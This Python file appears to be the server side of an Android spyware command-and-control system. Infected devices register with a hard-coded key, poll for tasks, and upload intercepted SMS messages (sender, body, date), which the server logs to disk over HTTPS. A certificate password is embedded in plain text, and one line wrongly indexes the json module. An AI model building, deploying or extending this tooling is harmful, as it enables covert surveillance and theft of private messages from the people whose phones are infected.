from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import os
import ssl
import uuid

import main

class RequestHandler(BaseHTTPRequestHandler):

    def _send_response(self, message, code):
        
        self.send_response(code)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write((message + "\n").encode("utf-8"))

    # def log_request(self, format, *args):
    #     # Removes annoying logging
    #     return

    def do_GET(self):
        if self.path == "/":
            # TODO: maybe do a html page to display what we got
            self._send_response("This is a GET message", 200)

        elif self.path == "/updog":
            response = "Whats Up Dog"
            print(f"Sending {response}")
            self._send_response(response, 200)

        elif self.path.startswith("/task/"):
            # Agent polls for task
            agentId = self.path.split("/")[-1]
            print(agentId.encode())

            if agentId in main.active_agents:
                agentTask = main.agent_command.get(agentId, "")
                print(agentTask)
                print(main.agent_command)
                if agentTask != "":
                    self._send_response(agentTask, 200)
                else:
                    self._send_response("", 201)
            else:
                self._send_response("", 204)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        json_data = json.loads(body.decode())

        if self.path == "/reg":
            self.handle_reg(json_data)

        elif self.path.startswith("/result/"):
            agentId = self.path.split("/")[-1]

            if agentId in main.active_agents:
                # Checks code, add your handlers below
                # and add on to this if else loop
                code = json["code"]
                if code == "sms":
                    self.handle_sms(json_data["data"])
                    # TODO: change the android code to include code and handle_sms to have code too
            
    def handle_reg(self, json_data):
        """
        Register an agent
        - generate uuid
        - Create the directory for this person
        - Respond 200 with the uuid
        """
        if (json_data.get("key", '') == "Potato"):
            agentId = str(uuid.uuid4())
            print(f"New agent: {agentId}")

            # Create directory for agent
            os.mkdir(f"data/{agentId}")
            os.mkdir(f"data/{agentId}/sms")

            # Add agent to active agents
            main.active_agents.append(agentId)

            self._send_response(agentId, 200)
        else:
            self._send_response("", 204)
            

    def handle_sms(self, json_data):
        # Print all json_data
        print(json_data["address"])
        print(json_data["body"])
        print(json_data["formatted_date"])
        print(json_data["type"])

        dir = "sms"

        if not os.path.exists(dir):
            os.makedirs(dir)

        # Save all json data
        with open("sms/sms_data.json", "a+") as outfile:
            json.dump(json_data, outfile)
            outfile.write("\n")
            

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')
        
def run(port):
    httpd = ThreadingHTTPServer(("",port), RequestHandler)

    # Create an SSL context
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem', password='P@ssw0rd')

    # Use the SSL context for the HTTPS server
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()
